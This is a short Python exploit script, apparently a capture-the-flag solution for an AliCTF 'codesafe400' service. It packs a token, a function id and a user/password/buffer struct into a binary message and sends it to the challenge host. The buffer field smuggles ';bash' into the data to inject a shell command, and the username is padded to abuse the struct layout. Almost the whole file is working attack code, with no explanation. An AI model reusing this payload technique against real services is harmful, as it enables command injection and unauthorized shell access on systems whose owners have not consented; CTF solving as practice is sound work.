#!/usr/bin/env python
# -*- coding: utf-8 -*-
from zio import *

ip = '10.211.55.48'
ip = '115.29.191.81'
ip = 'codesafe400.alictf.com'
port = 30000

# UINT_SIZE = 4
# buf[0] = len_token
# buf[1->len_token] = token
# buf[len_token+1] = function_id
# buf[len_token+2->len_token+2+UINT_SIZE-1] = host_len_data(len_data)
# buf[len_token+2+UINT_SIZE->len_token+2+UINT_SIZE+host_len_data-1] = data

token = '603a072175332a3fbb37f5b43f6bcde6'
len_token = len(token)
function_id = 1

# struct stc2
# {
#     char user[128];
#     char pass[128];
#     char buffer[256];
# };

usr = 'admin' + ' '*(64-5-1) + 'x' + ' '*63 + '\x00'
pwd = 'urejhvg' + '\x00'*(128-7)
buf = 'c'*255 + '\x00'
buf = ';bash'.ljust(255, '\x00') + '\x00'

len_data = 512
data = usr + pwd + buf

buf = ""
buf += chr(len_token)
buf += token
buf += chr(function_id)
buf += b32(len_data)
buf += data

io = zio((ip, port), timeout = 1000, print_write = COLORED(REPR))
io.write(buf)
io.read()
